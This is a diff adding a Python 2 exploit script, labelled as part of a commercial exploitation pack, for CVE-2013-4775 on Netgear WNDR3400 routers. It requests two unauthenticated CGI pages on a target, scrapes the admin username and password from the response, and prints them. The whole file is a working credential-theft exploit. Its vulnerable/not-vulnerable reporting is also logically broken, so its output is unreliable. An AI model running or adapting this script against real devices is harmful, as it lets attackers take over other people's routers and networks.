@@ -1,0 +1,65 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_netgear_5'
+_vendor_ = 'netgear'
+_model_  = ['N600 WIRELESS DUAL BAND WNDR3400 Firmware <= V1.0.0.38 ']
+_vuln_   = 'Password Disclosure'
+_cve_    = 'CVE-2013-4775'
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  nok = 0
+  uris = ['http://%s/unauth.cgi?id=393087602'%host, 'http://%s:8080/passwordrecovered.cgi?id=1738955828'%host]
+  for uri in uris:
+    try:
+      nfo = cStringIO.StringIO()
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, uri)
+      c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+      c.perform()
+    except Exception, e:
+      print '[-] error : %s' % e
+      return
+    status = c.getinfo(pycurl.HTTP_CODE)
+    if status != 200:
+      nok += nok
+      continue
+    data = nfo.getvalue()
+    try:
+      http_username = re.findall("<td class=\"MNUText\" align=\"left\">(.*?)</td>", data, re.DOTALL)[0]
+      http_password = re.findall("<td class=\"MNUText\" align=\"left\">(.*?)</td>", data, re.DOTALL)[1]
+    except Exception, e:
+      continue
+    if http_username:
+      print '[+] %s vulnerable' % host
+      print 'http creds : %s / %s' % (http_username, http_password)
+      nok = 0
+      break
+  if nok == 0:
+    print '[+] %s not vulnerable'%host
+    print '\n'.join(uris)
+  return
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
